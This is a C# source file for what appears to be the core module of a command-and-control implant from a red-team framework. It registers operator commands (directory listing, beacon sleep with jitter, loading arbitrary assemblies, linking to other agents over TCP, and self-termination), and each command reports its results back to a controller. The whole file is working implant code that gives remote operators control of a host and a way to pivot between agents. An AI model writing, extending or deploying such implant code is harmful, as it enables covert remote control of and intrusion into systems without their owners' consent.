using System.IO;
using System.Collections.Generic;

using Agent.Models;
using Agent.Commands;
using Agent.Interfaces;
using Agent.Controllers;

namespace Agent.Modules
{
    class CoreAgentModule : IAgentModule
    {
        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "Core",
                Developer = "Daniel Duggan, Adam Chester",
                Commands = new List<AgentModuleInfo.AgentCommand>
                {
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "ls",
                        Description = "List a Directory",
                        HelpText = "ls [path]",
                        Callback = ListDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "cd",
                        Description = "Change Directory",
                        HelpText = "cd [path]",
                        Callback = ChangeDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "pwd",
                        Description = "Print Working Directory",
                        HelpText = "pwd",
                        Callback = PrintWorkingDirectory
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "sleep",
                        Description = "Set the sleep time (in seconds) and jitter factor (percent).",
                        HelpText = "sleep [time] [jitter]",
                        Callback = SetSleep
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "loadmodule",
                        Description = "Load an Agent Module",
                        HelpText = "loadmodule [assembly]",
                        Callback = LoadAgentModule
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "link",
                        Description = "Link to a TCP Agent",
                        HelpText = "link [ip] [port]",
                        Callback = HandleLink,
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "exit",
                        Description = "Kills the agent",
                        HelpText = "exit",
                        Callback = Exit
                    }
                }
            };
        }

        public void Initialise(AgentController agent, ConfigController config)
        {
            var moduleInfo = GetModuleInfo();
            agent.RegisterAgentModule(moduleInfo);
            agent.SendModuleRegistered(moduleInfo);
        }

        private void ListDirectory(string data, AgentController agent, ConfigController config)
        {
            var path = string.IsNullOrEmpty(data) ? Directory.GetCurrentDirectory() : data;
            var result = Core.ListDirectory(path);
            agent.SendCommandOutput(result);
        }

        private void ChangeDirectory(string data, AgentController agent, ConfigController config)
        {
            var path = string.IsNullOrEmpty(data) ? Directory.GetCurrentDirectory() : data;
            var result = Core.ChangeDirectory(path);
            agent.SendCommandOutput(result);
        }

        private void PrintWorkingDirectory(string data, AgentController agent, ConfigController config)
        {
            var result = Core.PrintWorkingDirectory();
            agent.SendCommandOutput(result);
        }

        private void SetSleep(string data, AgentController agent, ConfigController config)
        {
            var result = Core.SetSleep(data, config);
            agent.SendCommandOutput(result);
        }

        private void LoadAgentModule(string data, AgentController agent, ConfigController config)
        {
            if (string.IsNullOrEmpty(data)) { return; }
            Core.LoadAgentModule(data, agent, config);
        }

        private void HandleLink(string data, AgentController agent, ConfigController config)
        {
            Core.HandleLink(data, agent);
        }

        private void Exit(string data, AgentController agent, ConfigController config)
        {
            agent.Stop();
        }
    }
}